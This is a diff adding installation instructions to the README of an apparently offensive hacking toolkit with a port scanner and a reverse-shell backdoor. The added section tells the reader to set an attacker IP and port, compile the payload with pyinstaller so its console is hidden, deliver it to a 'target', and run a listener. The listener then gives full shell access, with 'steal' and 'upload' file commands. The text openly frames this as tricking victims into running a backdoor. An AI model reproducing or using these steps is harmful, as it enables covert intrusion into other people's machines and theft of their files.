@@ -29,3 +29,49 @@ Select the single/multiple/range/subnet of targets, specify ports you're interes
 Ever wanted to become a master of puppets? It's simple - just trick your target to execute a backdoor and gain a remote access to target machine!
 
 ![backdoor demo](project/demo/backdoor-demo.gif)
+
+
+## Installation
+
+- Portscanner
+  
+Nothing difficult - just clone and run.
+
+```bash
+  git clone https://github.com/danyash17/kiddo_toolbox.git
+  cd kiddo_toolbox/project/src/toolbox/
+  python3 portscanner.py
+```
+
+- Backdoor
+  
+More difficult to set up. First, clone a repo.
+
+```bash
+  git clone https://github.com/danyash17/kiddo_toolbox.git
+  cd kiddo_toolbox/project/src/toolbox/
+```
+
+After that, it's crucial to configure your **host ip** and **listening port** in payload. Do not mess up - IP must be of type **string** and PORT of type **int**.
+
+```bash
+  nano backdoor_payload.py
+  ## IP = "192.168.0.100"
+  ## PORT = 7777
+```
+
+So, the payload is configured. Now you need to transfer it to a target machine. You can simply put a python script *backdoor_payload.py* staight from this repo. Or, to do better, compile a binary executable to hide a console using *pyinstaller*.
+
+```bash
+  pyinstaller backdoor_payload.py --onefile --noconsole
+```
+After malicious delivery, be sure to run *backdoor_client.py* script to put up a listener. A payload will infinitely try to connect to client once it executed.
+
+You see *shell* label in your console? Victory! You now have full access to a terminal of a target machine. In addition to standard bash commands this payload have 2 commands to download and upload files from/to target machine.
+
+```bash
+  shell~('192.168.0.100', 47890)steal <target_filename>
+  shell~('192.168.0.100', 47890)upload <host_filename>
+```
+
+Feel free to explore it by yourself!
